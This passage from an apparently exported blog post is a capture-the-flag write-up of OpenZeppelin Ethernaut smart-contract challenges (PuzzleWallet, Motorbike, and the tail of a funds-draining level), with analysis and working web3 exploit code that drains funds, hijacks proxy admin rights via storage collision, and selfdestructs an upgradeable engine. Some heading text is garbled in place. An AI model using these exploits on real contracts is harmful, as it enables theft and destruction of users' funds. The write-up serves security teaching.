\n    console.log(\"Hacked !\")\n}\n\n\nmodule.exports = async  function() {\n  \n  contract = await contractABI.at(\"0x5b9777555BDC7bA0Dee12EBB6d0Fc1E6Dc83b20a\"); \n  await drainFunds();\n}\n```\n\n#### Solidity Contract for test and for the token3\n\nMake sure to add a reasonable balance to the instance.\n\n```js\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/IERC20.sol\";\nimport \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol\";\n\ncontract SwappableToken is ERC20 {\n\n  constructor( string memory name, string memory symbol, uint256 initialSupply) public ERC20(name, symbol) {\n        _mint(msg.sender, initialSupply);\n  }\n\n  function approve(address owner, address spender, uint256 amount) public returns(bool){\n    super._approve(owner, spender, amount);\n  }\n}\n\n// transfer(instanceAddress,ValueYouWant)\n```\n\n## PuzzleWallet\n\n**Challenge description**\n\n> The admin, which has the power of updating the logic of the smart contract. The owner, which controls the whitelist of addresses allowed to use the contract. The contracts were deployed, and the group was whitelisted. Everyone cheered for their accomplishments against evil miners.\n> Little did they know, their lunch money was at risk…\n  You'll need to hijack this wallet to become the admin of the proxy.\n  Things that might help::\n    Understanding how delegatecalls work and how msg.sender and msg.value behaves when performing one.\n    Knowing about proxy patterns and the way they handle storage variables.\n\n--------\n**Analysis**\n\nWe all know that smart contracts code is immutable. Once the smart contract is deployed it cannot be changed that's why companies are spending thousands of dollars to make sure that the smart contract is faultless before deployment. Proxies are on the other hand a way to make smart contracts seem upgradable. By adding a new layer in the form of contract we can now which version accepts incoming calls. The code is long and It took me quite a while to get a grasp of it. So I will be highlighting the most interesting parts\n\n```js\ncontract PuzzleProxy is UpgradeableProxy {\n    // Getting to know the storage's layout of our contract\n    address public pendingAdmin;\n    address public admin;\n    ...\n\n    function proposeNewAdmin(address _newAdmin) external {\n        pendingAdmin = _newAdmin;\n    }\n\n    ...\n\n    contract PuzzleWallet {\n        // PuzzleWallet storage's layout\n    using SafeMath for uint256;\n    address public owner;\n    ...\n\n        modifier onlyWhitelisted {\n           require(whitelisted[msg.sender], \"Not whitelisted\");\n            _;\n        }\n\n      // Can change the storage slot[1]\n      function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {\n      // contract's balance should be 0, but wait how much is it now ? \n      require(address(this).balance == 0, \"Contract balance is not 0\");\n      ...\n\n      // only owner can add to white list\n      function addToWhitelist(address addr) external {\n        require(msg.sender == owner, \"Not the owner\");\n        ...\n\n        // You should be in whitelisted to be here\n        function multicall(bytes[] calldata data) external payable onlyWhitelisted {\n            ...\n            assembly {\n                // for more low level ops\n                selector := mload(add(_data, 32))\n            }\n            ...\n            // deposit can only be called once \n            if (selector == this.deposit.selector) {\n                require(!depositCalled, \"Deposit can only be called once\");\n                // Protect against reusing msg.value\n                depositCalled = true;\n            }\n            ...\n            // To not mistake it for the normal contract to contract delegate let's call it selfDelegate.\n            (bool success, ) = address(this).delegatecall(data[i]);\n            require(success, \"Error while delegating call\");\n        }\n    }\n}\n\n\n```\n\nFollowing the inheritance tree I found finally how the proxy call the real implementation. It was hinted in the challenge description too.\n\n```js\n  let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)\n```\n\nOkay let's sum it up in a diagram.\n\n![PuzzleWallet diagram](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138015/9b067dbdb383316b6e46909a1bc3a9d8df1c699f4c6091286b753b9fd2e54fcc_e13u24.png)  \n\ndelegateCall can create big messes if we are not careful to the storage layout like we have seen in previous challenges. Let's inspect the storage layout for both contracts.\n\n![PuzzleWallet storage](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138027/f6f56436b637fed9a8b0a7f1353a0da755a55af222edb26ed38c71fb3d76435e_t0ouln.png)  \n\n`owner` and `pendingAdmin` both are at the slot[0] which is a very big problem. We can manipulate the pendingAdmin so when we `puzzleWalletAddress.delegateCall` we became the owner of the puzzleWallet contract ! huuuge.\n\nWe will be using the `proposeNewAdmin` to set the `pendingAdmin` value.\n\nOkay so now we can execute `owner` functions. Let's not forget our goal is to become the `owner` of the *Proxy* contract. Let's look for the function that can set `slot[1]` of the storage in both contracts.\n\n```js\n function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {\n      // contract's balance should be 0, but wait how much is it now ? \n      require(address(this).balance == 0, \"Contract balance is not 0\");\n      ...\n }\n```\n\nSo first of all we need to be `whitelisted`. We can do that\n\n```js\nawait contract.addToWhitelist(player);\n```\n\nSecond we need to make the contract balance to 0. `await web3.eth.getBalance(instance)` will return **0.001** ethers as balance. The `execute` function won't allow such a thing as we can only withdraw what we did deposit (It's tracked in storage variable `balances`). The only way to drain funds is to have more `balance` than the amount we deposited.\n\nIf we can't call deposit multiple times in one `multicall` how about we do it but by adding another layer of `multicall`\n\n![PuzzleWallet call hiearchy](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138026/bc95441a9b162a8b1494771895c5a3385ec0e2be3c4d26376c351eae4a5f5d1d_ggsn87.png)  \n\nThis allows to have the double of the msg.value as balance. Okay so we said we had **0.001** ethers as contract balance ? let's deposit 0.001 to our account so we can drain it. ( we will have the same value for our balance and the contract's ) . By having the contract's balance as 0 we can simply set the owner ow I mean maxBalance to our player account to **hijack the proxy**.\n\n-----\n**Exploitation**\n\n1. become the owner of the contract\n2. become whitelisted\n3. deposit the balance of the contract with multiple calls\n4. withdraw all funds\n5. setMaxBalance as our address\n\n> The proxy is completely transparent this is possible by loading the ABI of the PuzzleWallet and using the address of the proxy. Don't get confused the address is the proxy's !\n\n```js\nconst proposeAdminCall= web3.eth.abi.encodeFunctionCall({\nname: 'proposeNewAdmin',\n    type: 'function',\n    inputs: [\n        {\n            type: 'address',\n            name: '_newAdmin'\n        }\n    ]\n},player)\n\nawait web3.eth.sendTransaction({data:proposeAdminCall,from:player,to:instance});\n\nawait contract.addToWhitelist(player);\n\n// getting the deposit call data\n\nconst depositData = (await contract.methods('deposit()').request()).data\n\nconst multiCallData = (await contract.methods('multicall(bytes[])').request([depositData])).data\n\nawait contract.multicall([multicallData,multicallData],{value:toWei('0.001')}); // adding to our balance\n\nawait contract.execute(player,toWei('0.002'),'0x0'); // Draining funds\n\nawait contract.setMaxBalance(player) // It will convert upon call \n```\n\nChallenge solved ✅\n\n## Motorbike\n\n**Challenge description**\n\n> Ethernaut's motorbike has a brand new upgradeable engine design. \n>  Would you be able to selfdestruct its engine and make the motorbike unusable ?\n>Things that might help:\n    EIP-1967\n    UUPS upgradeable pattern\n    Initializable contract\n\n--------\n**Analysis**\n\nTo solve this challenge, we need to be familiar with both [Initializable](https://github.com/OpenZeppelin/openzeppelin-upgrades/blob/master/packages/core/contracts/Initializable.sol) and most importantly  the [EIP-1967](https://eips.ethereum.org/EIPS/eip-1967)\n\nAfter going through all the reading material, as usual I drew the diagram to understand the core logic of the contracts.\n\n![Motorbike Diagram](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138012/3ac10a42b6cb747f06aad171856c6d4814105583603857fbc5fd1e2549969c23_usrhte.png)  \n\nAfter drawing the diagram, I had many unanswered questions the most important one did we `initialize` the engine contract or not !\nI really know where the address of the *Engine* contract is in storage so I can check that !\n\n```js\nconst engineAddress = await web3.eth.getStorageAt(instance,'0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc');\n\n// let's check the value\nawait web3.eth.call({to:engineAddress,from:player,data:web3.eth.abi.encodeFunctionSignature('upgrader()')})\n// returned 0x000000\n// the initialize() wasn't called and that's our -----\n**Exploitation** !\n```\n\n-----\n**-----\n**Exploitation**ation**\n\n1. initialize the *Engine* contract so we become the **upgrader**.\n2. upgrade our *Engine* contract to our bomb contract ( which will selfdestruct )\n3. call selfdestruct, the call will be done through *delegateCall* so the actual *Engine* will be destructed !\n\nour evil contract\n\n```js\ncontract BombEngine { \n    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;\n\n    function destruct() public {\n        selfdestruct( payable ( 0x84e7a3679A82C2766Ff8382862ab883FF9460307));\n    }\n}\n```\n\n```js\nconst destructData= web3.eth.abi.encodeFunctionSignature('destruct()');\n\nconst data= web3.eth.abi.encodeFunctionCall({\n    name: 'upgradeToAndCall',\n    type: 'function',\n    inputs: [{\n        type: 'address',\n        name: 'newImplementation'\n    },{\n        type: 'bytes',\n        name: 'data'\n    }]\n}, [bombEngineAddress,destructData]);\n\nawait web3.eth.sendTransaction({to:engineAddress,from:player,data:data})\n\n// You can do a random call to the Engine contract it will revert because it's gone !\n```\n\nChallenge solved ✅\n\n",
+            "coverImage": {
+                "data": {
+                    "id": 49,
+                    "attributes": {
+                        "name": "openzeppelin_ethernaut.png",
+                        "alternativeText": "openzeppelin_ethernaut.png",
+                        "caption": "openzeppelin_ethernaut.png",
+                        "width": 1280,
+                        "height": 720,
+                        "formats": {
+                            "large": {
+                                "ext": ".png",
+                                "url": "https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659139050/large_openzeppelin_ethernaut_c431a176dd.png",
+                                "hash": "large_openzeppelin_ethernaut_c431a176dd",
+                                "mime": "image/png",
+                                "name": "large_openzeppelin_ethernaut.png",
+                                "path": null,
+                                "size": 481.17,
+                                "width": 1000,
+                                "height": 563,
+                                "provider_metadata": {
+                                    "public_id": "large_openzeppelin_ethernaut_c431a176dd",
+                                    "resource_type": "image"
+                                }
+                            },
+                            "small": {
+                                "ext": ".png",
+                                "url": "https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659139052/small_openzeppelin_ethernaut_c431a176dd.png",
+                                "hash": "small_openzeppelin_ethernaut_c431a176dd",
+                                "mime": "image/png",
+                                "name": "small_openzeppelin_ethernaut.png",
+                                "path": null,
+                                "size": 164.03,
+                                "width": 500,
+                                "height": 281,
+                                "provider_metadata": {
+                                    "public_id": "small_openzeppelin_ethernaut_c431a176dd",
+                                    "resource_type": "image"
+                                }
+                            },
+                            "medium": {
+                                "ext": ".png",
+                                "url": "https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659139051/medium_openzeppelin_ethernaut_c431a176dd.png",
+                                "hash": "medium_openzeppelin_ethernaut_c431a176dd",
+                                "mime": "image/png",
+                                "name": "medium_openzeppelin_ethernaut.png",
+                                "path": null,
+                                "size": 308.03,
+                                "width": 750,
+                                "height": 422,
+                                "provider_metadata": {
+                                    "public_id": "medium_openzeppelin_ethernaut_c431a176dd",
+                                    "resource_type": "image"
+                                }
+                            },
+                            "thumbnail": {
+                                "ext": ".png",
+                                "url": "https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659139048/thumbnail_openzeppelin_ethernaut_c431a176dd.png",
+                                "hash": "thumbnail_openzeppelin_ethernaut_c431a176dd",
+                                "mime": "image/png",
+                                "name": "thumbnail_openzeppelin_ethernaut.png",
+                                "path": null,
+                                "size": 52.54,
+                                "width": 245,
+                                "height": 138,
+                                "provider_metadata": {
+                                    "public_id": "thumbnail_openzeppelin_ethernaut_c431a176dd",
+                                    "resource_type": "image"
+                                }
+                            }
+                        },
+                        "hash": "openzeppelin_ethernaut_c431a176dd",
+                        "ext": ".png",
+                        "mime": "image/png",
+                        "size": 425.3,
+                        "url": "https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659139047/openzeppelin_ethernaut_c431a176dd.png",
+                        "previewUrl": null,
+                        "provider": "cloudinary",
+                        "provider_metadata": {
+                            "public_id": "openzeppelin_ethernaut_c431a176dd",
+                            "resource_type": "image"
+                        },
+                        "createdAt": "2022-07-29T23:57:32.825Z",
+                        "updatedAt": "2022-07-29T23:57:32.825Z"
+                    }
+                }
+            },
+            "tags": {
+                "data": [
+                    {
+                        "id": 3,
+                        "attributes": {
+                            "title": "Cybersecurity",
+                            "short": "cyber-sec",
+                            "createdAt": "2022-01-18T17:54:13.682Z",
+                            "updatedAt": "2022-01-18T17:58:30.169Z",
+                            "publishedAt": "2022-01-18T17:58:30.167Z"
+                        }
+                    },
+                    {
+                        "id": 9,
+                        "attributes": {
+                            "title": "Write-ups",
+                            "short": "tag",
+                            "createdAt": "2022-02-01T05:24:54.669Z",
+                            "updatedAt": "2022-07-30T00:56:22.335Z",
+                            "publishedAt": "2022-07-30T00:56:22.332Z"
+                        }
+                    },
+                    {
+                        "id": 10,
+                        "attributes": {
+                            "title": "Smart Contracts ",
+                            "short": "smart-contracts",
+                            "createdAt": "2022-07-30T00:56:17.417Z",
+                            "updatedAt": "2022-07-30T00:56:18.675Z",
+                            "publishedAt": "2022-07-30T00:56:18.671Z"
+                        }
+                    }
+                ]
+            }
+        }
+    }
+]
